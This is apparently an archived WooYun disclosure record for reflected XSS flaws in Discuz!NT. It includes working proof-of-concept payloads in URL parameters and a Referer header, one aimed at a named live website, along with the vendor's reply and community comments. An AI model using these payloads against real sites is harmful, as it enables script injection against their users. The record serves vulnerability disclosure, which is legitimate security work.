{"id": 2413, "wybug_id": "wooyun-2014-059743", "wybug_title": "Discuz!NT多处全版本通杀XSS", "wybug_corp": "Discuz!", "wybug_author": "xfkxfk", "wybug_date": "2014-05-07 14:30", "wybug_open_date": "2014-08-05 14:32", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "第三方不可信程序"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-11：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-05：\t细节向公众公开  简要描述： 我估计是被忽略的节奏~ 详细说明：  Discuz!NT存在多处反射型XSS，反射XSS本身都不好意思发出来的，但是看了下用户量很大（关键字：Powered by Discuz!NT）啊，关键是全版本通杀，综合利用起来危害和影响还是不小吧！这里我们拿Discuz!NT 3.6.601测试第一处XSS在showuser.aspx页面的ordertype参数http://127.0.0.1/showuser.aspx?orderby=111111&ordertype=%22%3C/script%3E%3Cimg%20src=1%20onerror=alert%281%29%3E&page=1\n\n第二处XSS在showuser.aspx页面的orderby参数http://127.0.0.1/showuser.aspx?orderby=%22%3C/script%3E%3Cimg%20src=1%20onerror=alert%281%29%3E&ordertype=111111&page=1\n\n第三处XSS在showtemplate.aspx页面的头信息，Referer中链接：http://10.65.40.6/showtemplate.aspxPOST：templateid=1Referer: \"></meta><ScRipt>alert(1);</ScRipt>\n\n   漏洞证明：  在给一个Discuz!NT 3.9.913版本证明：http://www.tianlubike.com/http://www.tianlubike.com/showuser.aspx?orderby=atestu&ordertype=%22%3C/script%3E%3Caudio%20src=fdifgk%20onerror=alert%281%29%3E&page=1\n\n   修复方案：  过滤或者转义下就行   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-05-08 09:37 厂商回复： 很感谢您提出的问题。Discuz!NT 为早期开发的DOTNET产品，现在已经停止维护了。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-07 14:36 |    \t\t乐乐、 \t\t\t( 普通白帽子  |\t\t\t        Rank:853 漏洞数:189        )\t\t \n  我估计是被忽略的节奏~    \n     2014-05-07 14:58 |    \t\t小威 \t\t\t( 普通白帽子  |\t\t\t        Rank:492 漏洞数:76        | 活到老，学到老!)\t\t \n  我估计是被忽略的节奏~    \n     2014-05-07 15:08 |    \t\tQQ852451559 \t\t\t( 实习白帽子  |\t\t\t        Rank:79 漏洞数:18        | 学生党)\t\t \n  我估计是被忽略的节奏~    \n     2014-05-07 15:39 |    \t\t辛巴 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:83        | 现实中的无能为力，不代表网络中也要低声下...)\t\t \n  我估计我要日天了    \n     2014-05-07 16:34 |    \t\t阿仁 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 活到老学到老)\t\t \n  坐等公开    \n     2014-05-07 17:10 |    \t\trootnmxx \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        )\t\t \n  就等这样的漏洞了    \n     2014-05-07 23:54 |    \t\t五色花 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | jvav)\t\t \n  不错 ！支持下    \n     2014-05-08 09:42 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  @Discuz! 确认了哦，谢谢。已知停运，影响甚大，以发之    \n     2014-05-28 10:20 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  当初我就觉得很奇怪，为什么dz那边突然搞了个.NET的，然后果然和我想的一样，根本就维护不下去    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}